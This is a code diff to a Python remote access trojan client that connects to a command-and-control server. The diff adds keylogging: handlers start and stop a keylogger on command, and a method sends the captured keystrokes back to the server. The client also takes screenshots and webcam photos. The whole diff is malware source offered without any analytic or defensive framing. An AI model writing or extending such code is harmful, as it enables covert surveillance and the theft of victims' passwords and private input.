@@ -16,6 +16,7 @@ sys.path.append(os.path.join(os.path.dirname(__file__), 'modules'))
 from modules.screenshot import take_screenshot
 from modules.popup import show_popup, show_info_popup, show_warning_popup, show_error_popup
 from modules.photo import take_photo
+from modules.keylogger import get_keylogger
 
 # Import protocol from server directory
 sys.path.append(os.path.join(os.path.dirname(__file__), '..', 'server'))
@@ -30,6 +31,7 @@ class RATClient:
         self.socket = None
         self.running = False
         self.heartbeat_interval = 30  # seconds
+        self.keylogger = None
         
     def connect(self) -> bool:
         """Connect to C2 server"""
@@ -111,6 +113,12 @@ class RATClient:
             elif cmd == Commands.PHOTO:
                 self.handle_photo_command()
                 
+            elif cmd == Commands.KEYLOG_START:
+                self.handle_keylog_start_command()
+                
+            elif cmd == Commands.KEYLOG_STOP:
+                self.handle_keylog_stop_command()
+                
             elif cmd == Commands.QUIT:
                 self.running = False
                 
@@ -174,6 +182,67 @@ class RATClient:
         except Exception as e:
             self.send_error(f"Photo error: {e}")
     
+    def handle_keylog_start_command(self):
+        """Handle keylog start command"""
+        try:
+            print("[*] Starting keylogger...")
+            
+            # Initialize keylogger with callback to send data
+            self.keylogger = get_keylogger()
+            self.keylogger.callback = self.send_keylog_data
+            
+            success = self.keylogger.start_logging()
+            
+            if success:
+                self.send_response(ResponseTypes.KEYLOG_STATUS, {
+                    "status": "started",
+                    "message": "Keylogger started successfully"
+                })
+                print("[+] Keylogger started")
+            else:
+                self.send_error("Failed to start keylogger")
+                
+        except Exception as e:
+            self.send_error(f"Keylogger start error: {e}")
+    
+    def handle_keylog_stop_command(self):
+        """Handle keylog stop command"""
+        try:
+            print("[*] Stopping keylogger...")
+            
+            if self.keylogger:
+                final_data = self.keylogger.stop_logging()
+                
+                # Send final data if available
+                if final_data:
+                    self.send_keylog_data(final_data)
+                
+                self.send_response(ResponseTypes.KEYLOG_STATUS, {
+                    "status": "stopped",
+                    "message": "Keylogger stopped successfully"
+                })
+                print("[+] Keylogger stopped")
+            else:
+                self.send_response(ResponseTypes.KEYLOG_STATUS, {
+                    "status": "not_running",
+                    "message": "Keylogger was not running"
+                })
+                
+        except Exception as e:
+            self.send_error(f"Keylogger stop error: {e}")
+    
+    def send_keylog_data(self, data: str):
+        """Send keylog data to server"""
+        try:
+            if data and self.running:
+                self.send_response(ResponseTypes.KEYLOG_DATA, {
+                    "timestamp": time.time(),
+                    "data": data
+                })
+                print(f"[+] Sent keylog data ({len(data)} chars)")
+        except Exception as e:
+            print(f"[-] Failed to send keylog data: {e}")
+    
     def send_response(self, response_type: str, payload=None):
         """Send response to server"""
         try:
@@ -189,6 +258,14 @@ class RATClient:
     def cleanup(self):
         """Clean up client connection"""
         self.running = False
+        
+        # Stop keylogger if running
+        if self.keylogger:
+            try:
+                self.keylogger.stop_logging()
+            except:
+                pass
+        
         if self.socket:
             try:
                 self.socket.close()
